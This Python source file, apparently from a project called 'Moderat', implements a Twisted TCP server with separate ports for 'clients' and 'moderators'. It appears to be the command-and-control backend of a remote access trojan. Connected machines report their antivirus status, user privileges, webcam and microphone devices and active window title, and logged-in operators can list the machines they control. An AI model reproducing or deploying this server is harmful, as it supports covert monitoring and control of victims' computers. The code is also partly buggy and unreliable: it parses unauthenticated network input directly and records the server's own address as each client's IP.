from twisted.internet.protocol import Protocol, ServerFactory
from twisted.internet import reactor

from ClientsManagment import ClientsManagment
from ModeratorsManagment import ModeratorsManagment
from ModeratorsSessions import SessionsManagment

import logging
from logging.handlers import RotatingFileHandler
import sys

import string
import random
import ast

LOGFILE = 'server.log'
CLIENTS_PORT = 4434
MODERATORS_PORT = 1313

# Initialize logger
log = logging.getLogger('')
log.setLevel(logging.DEBUG)
format = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")

ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(format)
log.addHandler(ch)

fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupCount=7)
fh.setFormatter(format)
log.addHandler(fh)


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

clients = {}
moderators = {}

class ModeratServerProtocol(Protocol):

    # New Connection Made
    def connectionMade(self):
        self.send_message_to_client(self, 'connectSuccess', 'welcome')

    def connectionLost(self, reason):
        global clients

        # Delete Socket Entry
        for key, value in clients.items():
            if value['socket'] == self:
                del clients[key]


    def dataReceived(self, data):
        # Data Received
        command = self.recieve_message(data)
        # Switch to client commands
        if command['from'] == 'client':
            self.client_commands(command['payload'], command['mode'])
        # Switch to moderator commands
        elif command['from'] == 'moderator':
            self.moderator_commands(command)

    def client_commands(self, payload, mode):

        # Clients Initializing
        if mode == 'clientInitializing':

            log.info('Get Key If Exists Or Generate New One')

            # If client has no key generate new one and send
            if payload == 'noKey':
                log.info('Generate New Key')
                client_id = id_generator()

                self.send_message_to_client(self, client_id, 'clientInitializing')

            # else get key from client
            else:
                client_id = payload

            clients[client_id] = {
                'socket': self,
                'status': False,
            }

            log.info('[*] New Client from %s' % self.transport.getHost())

            # Create Client DB Entry
            self.factory.ManageClients.create_client('admin', client_id, self.transport.getHost().host)
            self.factory.ManageClients.set_client_online(client_id)

        # Clients Status Checker
        elif mode == 'infoChecker':
            clients[payload['key']] = {
                'ip_address':           self.transport.getHost().host,
                'os_type':              payload['os_type'],
                'os':                   payload['os'],
                'protection':           payload['protection'],
                'user':                 payload['user'],
                'privileges':           payload['privileges'],
                'audio_device':         payload['audio_device'],
                'webcamera_device':     payload['webcamera_device'],
                'window_title':         payload['window_title'],
                'key':                  payload['key'],
                'socket':               self,
            }

    def moderator_commands(self, data):

        if data['mode'] == 'moderatorInitializing':

            # Initializing Moderator
            log.info('Initializing Moderator')
            if data['payload'].startswith('auth '):
                if len(data['payload'].split()) == 3:
                    command, username, password = data['payload'].split()

                    # If Login Success
                    if self.factory.ManageModerators.login_user(username, password):

                        privileges = self.factory.ManageModerators.get_privs(username)

                        log.info('Moderator (%s) Login Success' % username)
                        self.send_message_to_moderator(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')

                        # Create Session For Moderator and Save
                        log.info('Create Session for Moderator (%s)' % data['session_id'])
                        moderators[data['session_id']] = {'username': username}

                    # if Login Not Success
                    else:
                        log.warning('Moderator (%s) Login Error' % username)
                        self.send_message_to_moderator(self, 'loginError', 'moderatorInitializing')

        # Check if session id is active
        elif data['mode'] == 'getClients' and data['session_id'] in moderators:
            clients_ids = self.factory.ManageClients.get_clients(moderators[data['session_id']]['username'])
            shared_clients = {}

            # for online clients
            for client_id in clients_ids:
                _id = client_id[0]
                print _id
                print clients
                print clients.has_key(_id)
                # Online Clients
                if clients.has_key(_id):
                    shared_clients[_id] = {
                        'moderator':            self.factory.ManageClients.get_moderator(_id),
                        'alias':                self.factory.ManageClients.get_alias(_id),
                        'ip_address':           self.transport.getHost().host,
                        'os_type':              clients[_id]['os_type'],
                        'os':                   clients[_id]['os'],
                        'protection':           clients[_id]['protection'],
                        'user':                 clients[_id]['user'],
                        'privileges':           clients[_id]['privileges'],
                        'audio_device':         clients[_id]['audio_device'],
                        'webcamera_device':     clients[_id]['webcamera_device'],
                        'window_title':         clients[_id]['window_title'],
                        'key':                  clients[_id]['key'],
                        'status':               True
                    }
                # Offline Clients
                else:
                    shared_clients[client_id] = {
                        'moderator':    self.factory.ManageClients.get_moderator(_id),
                        'key':           _id,
                        'alias':        self.factory.ManageClients.get_alias(_id),
                        'ip_address':   self.factory.ManageClients.get_ip_address(_id),
                        'last_online':  self.factory.ManageClients.get_last_online(_id),
                        'status':       False
                    }

            self.send_message_to_moderator(self, shared_clients, 'getClients')


    def recieve_message(self, data, end='[ENDOFMESSAGE]'):
        return ast.literal_eval(data[:-len(end)].decode('utf-8'))

    def send_message_to_client(self, client, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        # Send Data Function
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        client.transport.write(str(message)+end)

    def send_message_to_moderator(self, moderator, message, mode, _from='server', end='[ENDOFMESSAGE]'):
        message = {
            'payload': message,
            'mode': mode,
            'from': _from,
            'to': '',
        }
        moderator.transport.write(str(message)+end)


class ModeratServerFactory(ServerFactory):

    log.info('Moderat Server Started')

    protocol = ModeratServerProtocol

    ManageClients = ClientsManagment()
    ManageModerators = ModeratorsManagment()
    ManageSessions = SessionsManagment()

    def __init__(self):
        pass


reactor.listenTCP(CLIENTS_PORT, ModeratServerFactory())
log.info('Set Clients Port to %s' % str(CLIENTS_PORT))
reactor.listenTCP(MODERATORS_PORT, ModeratServerFactory())
log.info('Set Moderators Port to %s' % str(MODERATORS_PORT))
reactor.run()